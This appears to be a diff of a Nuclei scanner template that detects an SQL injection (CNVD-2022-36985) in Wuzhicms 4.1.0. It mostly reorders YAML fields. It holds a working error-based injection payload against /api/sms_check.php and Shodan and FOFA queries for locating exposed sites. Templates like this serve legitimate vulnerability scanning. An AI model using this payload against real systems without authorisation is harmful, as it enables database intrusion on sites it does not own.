@@ -1,4 +1,5 @@
 id: CNVD-2022-36985
+
 info:
   name: Wuzhicms 4.1.0 - SQL Injection
   author: princechaddha
@@ -14,25 +15,29 @@ info:
     cwe-id: CWE-89
     cpe: cpe:2.3:a:wuzhicms:wuzhicms:*:*:*:*:*:*:*:*
   metadata:
-    fofa-query: title="Wuzhicms"
-    max-request: 1
-    product: wuzhicms
-    shodan-query: http.html:"Wuzhicms"
-    vendor: wuzhicms
     verified: true
-  tags: cnvd,cnvd2022,sqli,vuln,wuzhicms
+    max-request: 1
+    shodan-query: http.html:"Wuzhicms"
+    fofa-query: title="Wuzhicms"
+    product: wuzhicms
+    vendor: wuzhicms
+  tags: cnvd,cnvd2022,wuzhicms,sqli,vuln
 variables:
   num: "999999999"
+
 http:
-  - matchers:
-      - part: body
-        type: word
-        words:
-          - c8c605999f3d8352d7bb792cf3fdb25
-      - status:
-          - 200
-        type: status
-    matchers-condition: and
-    method: GET
+  - method: GET
     path:
-      - '{{BaseURL}}/api/sms_check.php?param=1%27%20and%20updatexml(1,concat(0x7e,(SELECT%20md5({{num}})),0x7e),1)--%20'
+      - "{{BaseURL}}/api/sms_check.php?param=1%27%20and%20updatexml(1,concat(0x7e,(SELECT%20md5({{num}})),0x7e),1)--%20"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'c8c605999f3d8352d7bb792cf3fdb25'
+
+      - type: status
+        status:
+          - 200
+# digest: 4b0a00483046022100c775900b9df37a96ab27145243659eda73dc9082d9e4afab0abf47ce4bab748b022100b9065b0ce39550c3e887049a1196efb888aa8768b789513134b0b94af10e2354:922c64590222798bb761d5b6d8e72950
